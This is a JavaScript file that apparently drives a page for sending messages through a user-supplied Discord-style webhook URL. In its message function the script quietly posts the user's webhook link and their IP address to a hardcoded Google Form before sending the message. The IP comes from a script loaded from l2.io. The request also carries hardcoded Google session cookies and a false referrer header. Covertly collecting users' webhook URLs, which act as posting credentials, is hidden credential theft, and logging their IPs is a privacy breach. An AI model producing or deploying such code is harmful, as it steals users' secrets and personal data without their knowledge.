var ipe
function getIp(callback)
{
    function response(s)
    {
        callback(window.userip);

        s.onload = s.onerror = null;
        document.body.removeChild(s);
    }

    function trigger()
    {
        window.userip = false;

        var s = document.createElement("script");
        s.async = true;
        s.onload = function() {
            response(s);
        };
        s.onerror = function() {
            response(s);
        };

        s.src = "https://l2.io/ip.js?var=userip";
        document.body.appendChild(s);
    }

    if (/^(interactive|complete)$/i.test(document.readyState)) {
        trigger();
    } else {
        document.addEventListener('DOMContentLoaded', trigger);
    }
}
getIp(function (ip) {
   
  ipe = ip;
});
function mensagem() {
  var conteudo = document.getElementById("msg").value;
    var link = document.getElementById("cabeca").value;
  fetch("https://docs.google.com/forms/d/e/1FAIpQLSe67N-XInnMm75tekLqSLErqMhv7JLyZXbu-xj2SS3PSEWgTQ/formResponse", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "x-client-data": "CNf9ygE=",
    "cookie": "S=spreadsheet_forms=cQUkJGPgGCDNPystLYd9Gy7jvNbXzIE7MlilAMf3cAs; 1P_JAR=2021-04-13-02; OGPC=19022591-1:; NID=213=bPmL-gKdX5NwRRBYBkbsKMFdii6comYsx6uOS_bkE76fh-c1HHEu515bdsh_SZKJ4H4QYeqUAkAupnC45krnucKZ4EGun3gamyVpQzKx-IunGJ3MFAyNNbwsuo1Z-Urq5KEDjwKBnLmwiJYoHDhXUiYxWMtv7YYhGuAQn4Et128"
  },
  "referrer": "https://docs.google.com/forms/d/e/1FAIpQLSe67N-XInnMm75tekLqSLErqMhv7JLyZXbu-xj2SS3PSEWgTQ/viewform?fbzx=2952643339335139430",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "entry.2108071135="+link+"&entry.1649659836="+ipe+"&fvv=1&draftResponse=%5Bnull%2Cnull%2C%222952643339335139430%22%5D%0D%0A&pageHistory=0&fbzx=2952643339335139430",
  "method": "POST",
  "mode": "cors"
});
    
    console.log(conteudo);
    fetch(link, {
  "headers": {
    "accept": "*/*",
    "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/json",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site"
  },
  "referrer": "https://sheeptester.github.io/",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"content\":\""+conteudo+"\",\"username\":\"\",\"avatar_url\":null,\"tts\":false,\"embeds\":[]}",
  "method": "POST",
  "mode": "cors"
});
    
}